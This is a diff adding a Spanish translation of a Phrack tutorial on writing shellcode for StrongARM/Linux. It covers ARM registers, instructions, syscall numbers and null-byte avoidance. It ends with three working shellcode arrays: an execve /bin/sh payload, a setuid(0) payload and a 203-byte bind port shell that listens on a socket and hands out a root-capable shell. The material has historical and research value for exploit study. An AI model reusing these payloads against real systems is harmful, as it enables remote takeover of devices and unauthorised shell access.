@@ -1,0 +1,510 @@
+                             ==Phrack Inc.==
+
+             Volumen 0x0b, Numero 0x3a, Archivo #0x0a de 0x0e
+
+|=----------=[ Desarrollando shellcode para StrongARM/Linux ]=-----------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------=[ funkysh <funkysh@sm.pl> ]=----------------------=|
+
+
+                             "Into my ARMs"
+
+
+---[  Introduccion
+
+
+  Este texto cubre informaciones necesitadas para escribir shellcode para
+StrongARM Linux. Todos los ejemplos presentados en este texto fueron
+desarrollados en Compaq iPAQ H3650 con un procesador StrongARM-1110 corriendo
+Debian Linux. Nota que este documento no es una guia completa de la
+arquitectura ARM ni un tutorial de lenguaje assembler, mientras espero
+que tampoco contenga mayores bugs, no hay nada peor quizas que StrongARM no
+pueda ser completamente compatible con otros ARMs (sin embargo, casi siempre
+me refiero a "ARM" cuando pienso que no es un numero). El documento esta
+dividido en nueve secciones:
+
+  * Breve historia de ARM
+  * Arquitectura ARM
+  * Registros ARM
+  * Set de Instrucciones
+  * System calls
+  * Operacione comunes
+  * Evitar Null
+  * Codigos de ejemplo
+  * Referencias
+
+
+
+---[  Breve historia de ARM
+
+
+  El primer procesador ARM (por ARM se entiende Advanced RISC Machine) fue
+dise~ado y manufacturado por Acorn Computer Group a mediados de los 80'.
+Ya que la meta inicial era construir un procesador de bajo costo con baja
+consumicion de energia, alta performance y eficiencia de poder. En 1990
+Acorn junto con Apple Computer creo una nueva compa~ia Advanced RISC Machines
+Ltd. Hoy en dia ARM Ltd no hace procesadores solo los dise~a y licencia su
+dise~o a manufacturadores de tercera parte. La tecnologia ARM esta
+actualmente licenciada por un numero de grandes compa~ias incluyendo Lucent,
+3Com, HP, IBM, Sony y algunas otras.
+
+  StrongARM es un resultado del trabajo de ARM Ltd y Digital en el dise~o
+que usa el set de instrucciones de los procesadores ARM, pero el cual es
+contruido con tecnologia barata de las series Alpha. Digital vendio su
+manufacturacion de chips a Intel Corporation. El StrongARM de Intel
+(incluyendo SA-110 y SA-1110) implementa la arquitectura ARM v4 definida
+en [1].
+
+
+
+---[  Arquitectura ARM
+
+
+  El ARM es un microprocesador de 32 bits dise~ado en arquitectura RISC,
+eso significa que tiene un reducido set de instrucciones en oposicion al
+tipico CISC como x86 o m68k. Las ventajas del set de instrucciones reducido
+incluyen posibilidad de optimizar velocidad usando por ejemplo pipelining
+o logica hard-wired. Tambien las instrucciones y los modos de
+direccionamiento pueden hacer identicos para la mayoria de las instrucciones.
+ARM es una arquitectura guardar/cargar donde las operacines de procesamiento
+de datos solo operan en contenidos de registros, no directamente en
+contenidos de memoria. Esta tambien soportando caracteristicas adicionales
+como instrucciones Load y Store Multiple y ejecucion condicional de todas
+las instrucciones.
+Obviamente cada instruccion tiene el mismo largo de 32 bits.
+
+
+---[  Registros ARM
+
+
+  ARM tiene 16 registros visibles de 32 bits: r0 a r14 y r15 (pc). Para
+simplificar la cosa podemos decir que hay 13 registros de 'proposito general'
+r0 a r12 (registros del r0 a r7 son registros desbancados que significa que
+se refieren al mismo registro fisico de 32 bits en todos los modos del
+procesador, no tienen uso especial y pueden ser usados libremente en donde
+sea que un registro de proposito general este permitido en instruccion)
+y tres registros reservados para propositos 'especiales' (en realidad los
+15 registros son de proposito general):
+    
+   r13 (sp)     -  stack pointer
+   r14 (lr)     -  registro link
+   r15 (pc/psr) -  contador de programa/registro de estado
+
+  El registro r13 tambien conocido como 'sp' es usado como stack pointer y
+ambos con el registro link son usados para implementar funciones o subrutinas
+en lenguaje assembler de ARM. El registro link - r14 tambien conocido como
+'lr' es usado para contener la direccion de retorno de subrutina. Cuando
+una llamada subrutina es llevada a cabo por ej. la instruccion bl r14 es
+puesta a direccion de retorno de subrutina. Entonces el retorno de subrutina
+es llevado a cabo copiando r14 al contador del programa.
+
+  El stack en ARM crece en las direcciones bajas de memoria y el stack
+pointer apunta al ultimo item escrito a el, es llamado "stack
+complementamente descendiente". Por ejemplo resultado de ubicar 0x41 y
+despues 0x42 en el stack se ve asi:
+
+ direccion de memoria   valor stack 
+
+                      +------------+
+          0xbffffdfc: | 0x00000041 |
+                      +------------+
+   sp ->  0xbffffdf8: | 0x00000042 |
+                      +------------+
+
+
+---[  Set de Instrucciones
+
+
+  Como fue escrito arriba ARM como muchas otras RISC CPUs tiene instrucciones
+fixed-length (en este caso 32 bits de ancho). Fue tambien mencionado que todas
+las instrucciones pueden ser condicionales, por lo que en representacion bit
+los 4 bits tope (31-28) son usados para especificar condicion bajo la cual
+la instruccion es ejecutada.
+
+Las instrucciones interesantes para nosotros pueden ser divididas en cuatro
+clases:
+
+  - instrucciones branch,  
+  - instrucciones load y store,
+  - instrucciones de procesamiento de datos,
+  - instrucciones generadoras de excepciones,
+
+El registro de estado transfiere y las instrucciones del coprocesador son
+omitidas aqui.
+
+
+ 1. Instrucciones Branch
+    --------------------
+
+ Hay dos instrucciones branch: 
+
+               branch:  b <offset firmado de 24 bits>
+ 
+      branch con link:  bl <offset firmado de 24 bits>
+ 
+
+Ejecutando 'branch con link' - como fue mencionado en la seccion previa,
+resulta con configurar 'lr' con la direccion de la siguiente instruccion.
+
+
+ 2. Instrucciones de procesamiento de datos
+    ---------------------------------------
+
+Las Instrucciones de procesamiento de datos en general usan un formato de 3
+direcciones:
+ 
+ <opcode mnemonico> <destino> <operando 1> <operando 2>
+
+El destino es siempre registro, operando 1 tambien debe ser uno de los
+registros del r0 a r15, y operando 2 puede ser registro, registro cambiado
+o valor inmediato.
+
+ Algunos ejemplos:
+
+  -----------------------------+----------------+--------------------+
+                  suma:   add  | add r1,r1,#65  | set r1 = r1 + 65   |
+                 resta:   sub  | sub r1,r1,#65  | set r1 = r1 - 65   |
+            AND logico:   and  | and r0,r1,r2   | set r0 = r1 AND r2 |
+   OR exclusivo logico:   eor  | eor r0,r1,#65  | set r0 = r1 XOR r2 |
+             OR logico:   orr  | orr r0,r1,r2   | set r0 = r1 OR r2  |
+                  move:   mov  | mov r2,r0      | set r2 = r0        |
+
+
+ 3. Instrucciones Load y store
+    ---------------------------
+
+   
+ cargar registro desde memoria:  ldr rX, <direccion>    
+ 
+  Ejemplo: ldr r0, [r1] carga r0 con un word de 32 bits desde la direccion
+especificada en r1, hay tambien una instruccion ldrb responsable de cargar
+8 bits, e instrucciones analogicas para guardar registros en memoria:
+                    
+  guardar registro en memoria:  str rX, <direccion>     (guarda 32 bits)
+                                strb rX, <direccion>    (guarda 8 bits)
+
+  ARM soporta tambien guarda/carga de multiples registros, es una
+caracteristica muy interesante desde el punto de vista de la optimizacion,
+aqui va stm (guarda multiples registros en memoria):
+
+ stm <registro base><tipo de stack>(!),{lista de registro}
+ 
+  El registro base puede ser cualquier registro, pero tipicamente es usado el
+stack pointer. Por ejemplo: stmfd sp!, {r0-r3, r6} guarda registros r0, r1,
+r2, r3 y r6 en la pila (en modo completamente descendiente - nota el "fd"
+mnemonico adicional despues de stm) stack pointer apuntara al lugar en donde
+esta guardado el registro r0.
+
+La instruccion analogica para cargar multiples registros desde memoria es: ldm
+
+
+ 4. Instrucciones generadoras de excepciones 
+    ----------------------------------------
+
+Interrupcion de Software: swi <numero> es solo interesante para nosotros,
+lleva a cabo excepcion de interrupcion de software, es usada como system call.
+
+
+La lista de instrucciones presentadas en esta seccion no esta completa, un
+set completo puede ser obtenido de [1].
+
+
+
+---[  Syscalls
+
+
+  En Linux con procesador StrongARM, la syscall base es movida a 0x900000,
+esta no es una buena informacion para escritores de shellcode, ya que tenemos
+que lidiar con un opcode de instruccion conteniendo byte cero.
+
+Un ejemplo syscall "exit" se ve asi:
+
+               swi 0x900001   [ 0xef900001 ]
+
+Aqui va una lista rapida de syscalls que pueden ser utilizables cuando
+se este escribiendo shellcode (el valor de retorno de la syscall es
+generalmente guardado en r0);
+
+
+       execve:
+       ------- 
+               r0 = const char *filename
+               r1 = char *const argv[]
+               r2 = char *const envp[]
+      call number = 0x90000b
+ 
+
+       setuid:
+       ------- 
+               r0 = uid_t uid
+      call number = 0x900017
+
+
+         dup2:
+         ----- 
+               r0 = int oldfd
+               r1 = int newfd
+      call number = 0x90003f
+
+
+       socket:
+       ------- 
+               r0 = 1 (SYS_SOCKET)
+               r1 = ptr to int domain, int type, int protocol
+      call number = 0x900066 (socketcall)
+
+
+         bind:
+         ----- 
+               r0 = 2 (SYS_BIND)
+               r1 = ptr to int  sockfd, struct sockaddr *my_addr, 
+                    socklen_t addrlen
+      call number = 0x900066 (socketcall)
+
+
+       listen:
+       ------- 
+               r0 = 4 (SYS_LISTEN)
+               r1 = ptr to int s, int backlog
+      call number = 0x900066 (socketcall)
+
+
+       accept:
+       ------- 
+               r0 = 5 (SYS_ACCEPT)
+               r1 = ptr int s,  struct  sockaddr  *addr,
+                    socklen_t *addrlen 
+      call number = 0x900066 (socketcall)
+
+
+
+---[  Operaciones comunes 
+
+ 
+ Cargando valores altos 
+ ----------------------
+
+  Debido a que todas las instrucciones en el ARM ocupan word de 32 bits
+incluyendo lugar para opcode, condicion y numeros de registro, no hay forma
+de cargar un valor inmediato alto dentro del registro en una instruccion.
+Este problema puede ser resuelto por una caracteristica llamada 'cambiado'.
+El assembler de ARM usa seis mnemonicos adicionales responsables de seis
+tipos de cambio diferentes:
+
+           lsl -  logical shift left
+           asl -  arithmetic shift left
+           lsr -  logical shift right
+           asr -  arithmetic shift right
+           ror -  rotate right
+           rrx -  rotate right with extend
+
+  Los cambiadores pueden ser usados con las instrucciones de procesamiento
+de datos, o con la instruccion ldr o str. Por ejemplo, para cargar r0 con
+0x900000 hacemos las siguientes operaciones:
+ 
+         mov   r0, #144           ; 0x90
+         mov   r0, r0, lsl #16    ; 0x90 << 16 = 0x900000
+
+
+ Independencia de Posicion
+ -------------------------
+
+  Obtener la posicion del codigo propio es muy facil ya que pc es un registro
+de proposito general y puede ser o leido en cualquier momento o cargado con
+un valor de 32 bits para hacer jump a cualquier direccion en memoria.
+
+Por ejemplo, despues de ejecutar:
+
+         sub   r0, pc, #4
+
+la direccion de la siguiente instruccion sera guardada en el registro r0.
+
+Otro metodo es ejecutar una instruccion branch con link:
+    
+         bl    sss
+         swi   0x900001
+  sss:   mov   r0, lr
+  
+Ahora r0 apunta a "swi 0x900001".
+
+ 
+ Loops
+ -----
+
+  Digamos que queremos construir un loop para ejecutar alguna instruccion
+tres veces. El loop tipico sera construido de esta forma:
+
+         mov   r0, #3     <- contador de loop
+ loop:   ...    
+         sub   r0, r0, #1 <- fd = fd -1 
+         cmp   r0, #0     <- chequear si r0 == 0 ya
+         bne   loop       <- ir a loop si no (if Z flag != 1)
+
+Este loop puede ser optimizado usando la instruccion subs que configurara la
+flag Z para nosotros cuando r0 alcance 0, entonces podemos eliminar un cmp.
+
+ 
+         mov   r0, #3
+ loop:   ...
+         subs  r0, r0, #1
+         bne   loop
+
+
+      
+ Instruccion Nop
+ ---------------
+
+  En ARM "mov r0, r0" es usado como nop, sin embargo contiene nulls entonces
+cualquier otra instruccion "neutral" tiene que ser usada cuando se escriban
+codigos de concepto de prueba para vulnerabilidades, "mov r1, r1" es solo
+un ejemplo.
+
+         mov   r1, r1    [ 0xe1a01001 ]
+          
+
+---[  Evitar Null
+
+
+  Casi cualquier instruccion que use el registro r0 generata 'cero' en ARM,
+esto puede ser generalmente resuelto reemplazandolo con otra instruccion
+o usando codigo auto-modificante.
+
+ Por ejemplo: 
+             e3a00041    mov   r0, #65      puede ser reemplazado con:
+   
+             e0411001    sub   r1, r1, r1
+             e2812041    add   r2, r1, #65
+             e1a00112    mov   r0, r2, lsl r1  (r0 = r2 << 0)
+
+ La syscall puede ser patcheada de la siguiente forma:
+
+             e28f1004    add   r1, pc, #4    <- obtiene direccion de swi
+             e0422002    sub   r2, r2, r2    
+             e5c12001    strb  r2, [r1, #1]  <- patchea 0xff con 0x00
+             ef90ff0b    swi   0x90ff0b      <- syscall paralizada
+ 
+ Multiples Store/Load tambien generan 'cero', incluso si el registro r0 no
+ es usado:
+ 
+             e92d001e    stmfd sp!, {r1, r2, r3, r4}
+ 
+ En codigos de ejemplo presentados en la siguiente seccion use guardado con
+ el registro link:
+
+             e04ee00e    sub   lr, lr, lr
+             e92d401e    stmfd sp!, {r1, r2, r3, r4, lr}
+
+
+---[  Codigos de ejemplo
+
+
+/*
+ * 47 byte StrongARM/Linux execve() shellcode
+ * funkysh
+ */
+
+char shellcode[]= "\x02\x20\x42\xe0"   /*  sub   r2, r2, r2            */
+                  "\x1c\x30\x8f\xe2"   /*  add   r3, pc, #28 (0x1c)    */
+                  "\x04\x30\x8d\xe5"   /*  str   r3, [sp, #4]          */
+                  "\x08\x20\x8d\xe5"   /*  str   r2, [sp, #8]          */
+                  "\x13\x02\xa0\xe1"   /*  mov   r0, r3, lsl r2        */
+                  "\x07\x20\xc3\xe5"   /*  strb  r2, [r3, #7           */
+                  "\x04\x30\x8f\xe2"   /*  add   r3, pc, #4            */
+                  "\x04\x10\x8d\xe2"   /*  add   r1, sp, #4            */
+                  "\x01\x20\xc3\xe5"   /*  strb  r2, [r3, #1]          */
+                  "\x0b\x0b\x90\xef"   /*  swi   0x90ff0b              */
+                  "/bin/sh";
+
+
+/*
+ * 20 byte StrongARM/Linux setuid() shellcode
+ * funkysh
+ */
+
+char shellcode[]= "\x02\x20\x42\xe0"   /*  sub   r2, r2, r2            */
+                  "\x04\x10\x8f\xe2"   /*  add   r1, pc, #4            */
+                  "\x12\x02\xa0\xe1"   /*  mov   r0, r2, lsl r2        */
+                  "\x01\x20\xc1\xe5"   /*  strb  r2, [r1, #1]          */
+                  "\x17\x0b\x90\xef";  /*  swi   0x90ff17              */
+
+
+/*
+ * 203 byte StrongARM/Linux bind() portshell shellcode
+ * funkysh
+ */
+
+char shellcode[]= "\x20\x60\x8f\xe2"   /*  add   r6, pc, #32           */
+                  "\x07\x70\x47\xe0"   /*  sub   r7, r7, r7            */
+                  "\x01\x70\xc6\xe5"   /*  strb  r7, [r6, #1]          */
+                  "\x01\x30\x87\xe2"   /*  add   r3, r7, #1            */
+                  "\x13\x07\xa0\xe1"   /*  mov   r0, r3, lsl r7        */
+                  "\x01\x20\x83\xe2"   /*  add   r2, r3, #1            */
+                  "\x07\x40\xa0\xe1"   /*  mov   r4, r7                */
+                  "\x0e\xe0\x4e\xe0"   /*  sub   lr, lr, lr            */
+                  "\x1c\x40\x2d\xe9"   /*  stmfd sp!, {r2-r4, lr}      */
+                  "\x0d\x10\xa0\xe1"   /*  mov   r1, sp                */
+                  "\x66\xff\x90\xef"   /*  swi   0x90ff66     (socket) */
+                  "\x10\x57\xa0\xe1"   /*  mov   r5, r0, lsl r7        */
+                  "\x35\x70\xc6\xe5"   /*  strb  r7, [r6, #53]         */
+                  "\x14\x20\xa0\xe3"   /*  mov   r2, #20               */
+                  "\x82\x28\xa9\xe1"   /*  mov   r2, r2, lsl #17       */
+                  "\x02\x20\x82\xe2"   /*  add   r2, r2, #2            */
+                  "\x14\x40\x2d\xe9"   /*  stmfd sp!, {r2,r4, lr}      */
+                  "\x10\x30\xa0\xe3"   /*  mov   r3, #16               */
+                  "\x0d\x20\xa0\xe1"   /*  mov   r2, sp                */
+                  "\x0d\x40\x2d\xe9"   /*  stmfd sp!, {r0, r2, r3, lr} */
+                  "\x02\x20\xa0\xe3"   /*  mov   r2, #2                */
+                  "\x12\x07\xa0\xe1"   /*  mov   r0, r2, lsl r7        */
+                  "\x0d\x10\xa0\xe1"   /*  mov   r1, sp                */
+                  "\x66\xff\x90\xef"   /*  swi   0x90ff66       (bind) */
+                  "\x45\x70\xc6\xe5"   /*  strb  r7, [r6, #69]         */
+                  "\x02\x20\x82\xe2"   /*  add   r2, r2, #2            */
+                  "\x12\x07\xa0\xe1"   /*  mov   r0, r2, lsl r7        */
+                  "\x66\xff\x90\xef"   /*  swi   0x90ff66     (listen) */
+                  "\x5d\x70\xc6\xe5"   /*  strb  r7, [r6, #93]         */
+                  "\x01\x20\x82\xe2"   /*  add   r2, r2, #1            */
+                  "\x12\x07\xa0\xe1"   /*  mov   r0, r2, lsl r7        */
+                  "\x04\x70\x8d\xe5"   /*  str   r7, [sp, #4]          */
+                  "\x08\x70\x8d\xe5"   /*  str	 r7, [sp, #8]          */
+                  "\x66\xff\x90\xef"   /*  swi   0x90ff66     (accept) */
+                  "\x10\x57\xa0\xe1"   /*  mov   r5, r0, lsl r7        */
+                  "\x02\x10\xa0\xe3"   /*  mov   r1, #2                */
+                  "\x71\x70\xc6\xe5"   /*  strb  r7, [r6, #113]        */
+                  "\x15\x07\xa0\xe1"   /*  mov   r0, r5, lsl r7 <dup2> */
+                  "\x3f\xff\x90\xef"   /*  swi   0x90ff3f       (dup2) */
+                  "\x01\x10\x51\xe2"   /*  subs  r1, r1, #1            */
+                  "\xfb\xff\xff\x5a"   /*  bpl   <dup2>                */
+                  "\x99\x70\xc6\xe5"   /*  strb  r7, [r6, #153]        */
+                  "\x14\x30\x8f\xe2"   /*  add   r3, pc, #20           */
+                  "\x04\x30\x8d\xe5"   /*  str	 r3, [sp, #4]          */
+                  "\x04\x10\x8d\xe2"   /*  add   r1, sp, #4            */
+                  "\x02\x20\x42\xe0"   /*  sub   r2, r2, r2            */
+                  "\x13\x02\xa0\xe1"   /*  mov   r0, r3, lsl r2        */
+                  "\x08\x20\x8d\xe5"   /*  str   r2, [sp, #8]          */
+                  "\x0b\xff\x90\xef"   /*  swi	 0x900ff0b    (execve) */
+                  "/bin/sh";
+
+
+---[  Referencias:
+
+
+[1] ARM Architecture Reference Manual - Issue D, 
+    2000 Advanced RISC Machines LTD
+
+[2] Intel StrongARM SA-1110 Microprocessor Developer's Manual,
+    2001 Intel Corporation
+
+[3] Using the ARM Assembler,
+    1988 Advanced RISC Machines LTD
+    
+[4] ARM8 Data Sheet,
+    1996 Advanced RISC Machines LTD
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+
+
